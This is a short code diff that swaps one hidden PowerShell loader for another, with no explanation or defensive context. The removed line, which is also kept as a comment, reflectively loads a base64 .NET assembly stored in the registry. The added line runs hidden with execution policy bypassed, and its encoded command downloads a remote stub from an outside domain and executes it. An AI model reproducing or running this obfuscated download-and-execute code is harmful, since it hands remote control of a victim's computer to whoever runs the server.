@@ -1,1 +1,4 @@
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand (Get-ItemProperty -Path 'HKCU:\\Software\\N/A' -Name 'command').encodedCommand; Start-Sleep -Seconds 0; [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty -Path 'HKCU:\\Software\\N\A' -Name 'encrypt').encrypt)).EntryPoint.Invoke($null, @())
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JABoAGUAYQBkAGUAcgBzACAAPQAgAEAAewAgACcAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAnACAAPQAgACcAeQBvAHUAcgBfAGYAaQB4AGUAZABfAHQAbwBrAGUAbgBfAGgAZQByAGUAJwAgAH0AOwAgAGkAZQB4ACAAKABpAHcAcgAgAC0AVQByAGkAIABoAHQAdABwAHMAOgAvAC8AZQBtAHAAdAB5AHMAZQByAHYAaQBjAGUAcwAuAHgAeQB6AC8AcwB0AHUAYgAuAHQAeAB0ACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ASABlAGEAZABlAHIAcwAgACQAaABlAGEAZABlAHIAcwApAA==
+
+
+#powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand (Get-ItemProperty -Path 'HKCU:\\Software\\N/A' -Name 'command').encodedCommand; Start-Sleep -Seconds 0; [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty -Path 'HKCU:\\Software\\N\A' -Name 'encrypt').encrypt)).EntryPoint.Invoke($null, @())
